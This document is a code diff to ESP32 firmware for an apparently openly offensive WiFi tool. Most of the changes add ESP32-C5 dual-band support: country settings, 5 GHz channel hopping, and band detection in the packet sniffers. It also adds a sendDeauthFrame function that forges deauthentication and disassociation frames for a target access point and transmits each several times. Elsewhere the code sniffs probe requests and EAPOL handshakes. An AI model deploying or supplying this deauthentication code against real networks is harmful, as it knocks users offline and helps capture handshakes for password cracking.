@@ -40,6 +40,10 @@ void WiFiModules::main() {
 	probe_req_ssids = new LinkedList<ProbeReqSsid>();
 
 	esp_wifi_init(&cfg);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+      	esp_event_loop_create_default();
+	#endif
 	esp_wifi_set_mode(WIFI_AP_STA);
 	esp_wifi_start();
 	wifi_initialized = true;
@@ -262,6 +266,9 @@ void WiFiModules::StartWiFiAttack(WiFiScanState attack_mode) {
 	ap_config.ap.beacon_interval = 10000;
 	ap_config.ap.ssid_len = 0;
 	esp_wifi_init(&cfg);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+	#endif
 	esp_wifi_set_storage(WIFI_STORAGE_RAM);
 	esp_wifi_set_mode(WIFI_MODE_AP);
 	esp_wifi_set_config(WIFI_IF_AP, &ap_config);
@@ -300,17 +307,29 @@ void WiFiModules::changeChannel() {
 }
 
 void WiFiModules::channelHop() {
+	#ifndef BOARD_ESP32_C5_DEVKIT_C1
 	this->set_channel = this->set_channel + 1;
-	if (this->set_channel > 13) {
+	if (this->set_channel > 14) {
 		this->set_channel = 1;
 	}
+	#else
+	//if (dual_band_channels_index >= DUAL_BAND_CHANNELS) dual_band_channels_index = 0;
+	//else this->dual_band_channels_index++;
+	this->set_channel = this->dual_band_channels[dual_band_channels_index];
+	dual_band_channels_index = (dual_band_channels_index + 1) % DUAL_BAND_CHANNELS;
+	#endif
+	
 	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
 	Serial.printf("[INFO] Changed channel to %d using channel hop\n", this->set_channel);
 	vTaskDelay(1 / portTICK_PERIOD_MS);
 }
 
 void WiFiModules::channelRandom() {
+	#ifndef BOARD_ESP32_C5_DEVKIT_C1
 	this->set_channel = random(14) + 1;
+	#else
+	this->set_channel = this->dual_band_channels[random(DUAL_BAND_CHANNELS)];
+	#endif
 	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
 	//Serial.printf("Channel channel to %d using channel random\n", this->set_channel);
 	vTaskDelay(1 / portTICK_PERIOD_MS);
@@ -526,6 +545,15 @@ void WiFiModules::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 					ie_offset += 2 + ie_length;
 				}
 
+				if (channel == 0) channel = snifferPacket->rx_ctrl.channel;
+
+				WiFiScanBand band;
+				if (channel > 13) {
+					band = WIFI_BAND_5Ghz;
+				} else {
+					band = WIFI_BAND_2_4Ghz;
+				}
+
 				if (!low_memory_warning)
 					//display_buffer->add("Ch:" + String(snifferPacket->rx_ctrl.channel) + " " + essid);
 					display_buffer->add("Ch:" + String(channel) + " " + essid);
@@ -559,7 +587,7 @@ void WiFiModules::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 					snifferPacket->payload[15]},
 					security_type, wpastr, false, new LinkedList<uint16_t>(),
 					{snifferPacket->payload[34], snifferPacket->payload[35]},
-					WIFI_BAND_2_4G,
+					band,
 					static_cast<int8_t>(snifferPacket->rx_ctrl.rssi)};
 				
 				if (!low_memory_warning) {
@@ -644,6 +672,15 @@ void WiFiModules::apstaSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 					ie_offset += 2 + ie_length;
 				}
 
+				if (channel == 0) channel = snifferPacket->rx_ctrl.channel;
+
+				WiFiScanBand band;
+				if (channel > 13) {
+					band = WIFI_BAND_5Ghz;
+				} else {
+					band = WIFI_BAND_2_4Ghz;
+				}
+
 				if (!low_memory_warning)
 					//display_buffer->add("Ch:" + String(snifferPacket->rx_ctrl.channel) + " " + essid);
 					display_buffer->add("Ch:" + String(channel) + " " + essid);
@@ -677,7 +714,7 @@ void WiFiModules::apstaSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 					snifferPacket->payload[15]},
 					security_type, wpastr, false, new LinkedList<uint16_t>(),
 					{snifferPacket->payload[34], snifferPacket->payload[35]},
-					WIFI_BAND_2_4G,
+					band,
 					static_cast<int8_t>(snifferPacket->rx_ctrl.rssi)};
 				
 				if (!low_memory_warning) {
@@ -883,6 +920,8 @@ void WiFiModules::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 				ie_offset += 2 + ie_length;
 			}
 
+			if (channel == 0) channel = snifferPacket->rx_ctrl.channel;
+
 			if (probe_req_essid.length() > 0) {
 				bool essidExist = false;
 				for (int i = 0; i < probe_req_ssids->size(); i++) {
@@ -966,6 +1005,9 @@ void WiFiModules::beaconSnifferCallback(void* buf , wifi_promiscuous_pkt_type_t 
 					
 				ie_offset += 2 + ie_length;
 			}
+
+			if (channel == 0) channel = snifferPacket->rx_ctrl.channel;
+
 			vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
 			add_to_buffer.concat("C:" + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel));
 			add_to_buffer.concat(" ");
@@ -1086,6 +1128,10 @@ void WiFiModules::StartAnalyzerScan() {
 	Serial.println("[INFO] Starting Analyzer scan...");
 
 	esp_wifi_init(&cfg2);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+		esp_event_loop_create_default();
+  	#endif
 	esp_wifi_set_storage(WIFI_STORAGE_RAM);
 	esp_wifi_set_mode(WIFI_MODE_NULL);
 	esp_wifi_start();
@@ -1104,6 +1150,10 @@ void WiFiModules::StartBeaconScan() {
 	logutils.createFile("beacon", true);
 
 	esp_wifi_init(&cfg2);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+		esp_event_loop_create_default();
+  	#endif
 	esp_wifi_set_storage(WIFI_STORAGE_RAM);
 	esp_wifi_set_mode(WIFI_MODE_NULL);
 	esp_wifi_start();
@@ -1125,6 +1175,10 @@ void WiFiModules::StartProbeReqScan() {
 	logutils.createFile("probe", true);
 
 	esp_wifi_init(&cfg2);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+		esp_event_loop_create_default();
+  	#endif
 	esp_wifi_set_storage(WIFI_STORAGE_RAM);
 	esp_wifi_set_mode(WIFI_MODE_NULL);
 	esp_wifi_start();
@@ -1144,6 +1198,10 @@ void WiFiModules::StartDeauthScan() {
 	logutils.createFile("deauth", true);
 
 	esp_wifi_init(&cfg2);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+		esp_event_loop_create_default();
+  	#endif
 	esp_wifi_set_storage(WIFI_STORAGE_RAM);
 	esp_wifi_set_mode(WIFI_MODE_NULL);
 	esp_wifi_start();
@@ -1163,6 +1221,10 @@ void WiFiModules::StartEapolScan() {
 	logutils.createFile("eapol", true);
 
 	esp_wifi_init(&cfg);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+		esp_event_loop_create_default();
+  	#endif
 	esp_wifi_set_storage(WIFI_STORAGE_RAM);
 	esp_wifi_set_mode(WIFI_MODE_AP);
 
@@ -1236,6 +1298,10 @@ void WiFiModules::StartAPWiFiScan() {
   	esp_event_loop_create_default();
 
   	esp_wifi_init(&cfg2);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+	 	esp_wifi_set_country(&country);
+    	esp_event_loop_create_default();
+	#endif
 	esp_wifi_set_storage(WIFI_STORAGE_RAM);
 	esp_wifi_set_mode(WIFI_MODE_NULL);
 	esp_wifi_start();
@@ -1512,6 +1578,28 @@ void WiFiModules::sendDeauthAttack() {
 				packet_sent -= 1;
 		}
 	}
+}
+
+void WiFiModules::sendDeauthFrame(uint8_t bssid[6], int channel) {
+	this->set_channel = channel;
+	changeChannel();
+	delay(1);
+	
+	// Build packet
+	memcpy(&deauth_frame_packet[10], bssid, 6);
+	memcpy(&deauth_frame_packet[16], bssid, 6);
+
+	memcpy(&disassoc_frame_packet[10], bssid, 6);
+	memcpy(&disassoc_frame_packet[16], bssid, 6);     
+  
+	// Send packet
+	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
+	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
+	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
+
+	esp_err_t res_4 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
+	esp_err_t res_5 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
+	esp_err_t res_6 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
 }
 
 void WiFiModules::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t sta_mac[6]) {
